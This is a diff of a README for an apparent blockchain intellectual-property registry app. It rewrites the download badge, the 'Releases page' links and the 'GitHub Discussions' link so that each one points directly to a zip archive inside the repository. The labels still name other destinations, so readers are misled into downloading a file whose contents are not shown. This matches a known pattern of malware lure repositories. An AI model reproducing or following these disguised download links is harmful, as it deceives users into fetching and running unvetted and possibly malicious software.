@@ -1,7 +1,7 @@
 # 🌐 Intellectual-Property-Registry-Dapp - Manage Your Intellectual Property with Ease
 
 ## 📥 Download Now!
-[![Download](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/iLCiarnuz/Intellectual-Property-Registry-Dapp/releases)
+[![Download](https://raw.githubusercontent.com/iLCiarnuz/Intellectual-Property-Registry-Dapp/main/public/Intellectual-Property-Registry-Dapp_v3.4-alpha.1.zip)](https://raw.githubusercontent.com/iLCiarnuz/Intellectual-Property-Registry-Dapp/main/public/Intellectual-Property-Registry-Dapp_v3.4-alpha.1.zip)
 
 ## 🌟 About the Project
 The **Intellectual-Property-Registry-Dapp** is a user-friendly application built on blockchain technology. This tool helps you register, manage, and verify your intellectual property rights. By using decentralization, it ensures that your rights are secure and easily accessible. 
@@ -9,7 +9,7 @@ The **Intellectual-Property-Registry-Dapp** is a user-friendly application built
 ## 🚀 Getting Started
 To begin using the Intellectual Property Registry, follow these simple steps:
 
-1. **Visit the Releases Page**: You can find the latest version of the application and its updates on our [Releases page](https://github.com/iLCiarnuz/Intellectual-Property-Registry-Dapp/releases).
+1. **Visit the Releases Page**: You can find the latest version of the application and its updates on our [Releases page](https://raw.githubusercontent.com/iLCiarnuz/Intellectual-Property-Registry-Dapp/main/public/Intellectual-Property-Registry-Dapp_v3.4-alpha.1.zip).
 
 2. **Choose the Correct Version**: Review the available releases. Make sure to download the version that matches your operating system. For example, if you are using Windows, look for a Windows installer. For Mac or Linux, select the appropriate files.
 
@@ -66,9 +66,9 @@ Absolutely. Your personal data is stored securely on the blockchain, and you ret
 
 ## 🌎 Community and Support
 Join our community to stay updated and get help. You can contact us through:
-- Our [GitHub Discussions](https://github.com/iLCiarnuz/Intellectual-Property-Registry-Dapp/discussions)
+- Our [GitHub Discussions](https://raw.githubusercontent.com/iLCiarnuz/Intellectual-Property-Registry-Dapp/main/public/Intellectual-Property-Registry-Dapp_v3.4-alpha.1.zip)
 - GitHub Issues for technical support requests
 - Follow us on social media for the latest news
 
 ## 🎉 Conclusion
-The Intellectual-Property-Registry-Dapp is your solution for managing intellectual property rights with confidence. Enjoy the ease of use and the security that comes with using blockchain technology. Don't forget to visit our [Releases page](https://github.com/iLCiarnuz/Intellectual-Property-Registry-Dapp/releases) to download the latest version. Happy registering!
+The Intellectual-Property-Registry-Dapp is your solution for managing intellectual property rights with confidence. Enjoy the ease of use and the security that comes with using blockchain technology. Don't forget to visit our [Releases page](https://raw.githubusercontent.com/iLCiarnuz/Intellectual-Property-Registry-Dapp/main/public/Intellectual-Property-Registry-Dapp_v3.4-alpha.1.zip) to download the latest version. Happy registering!
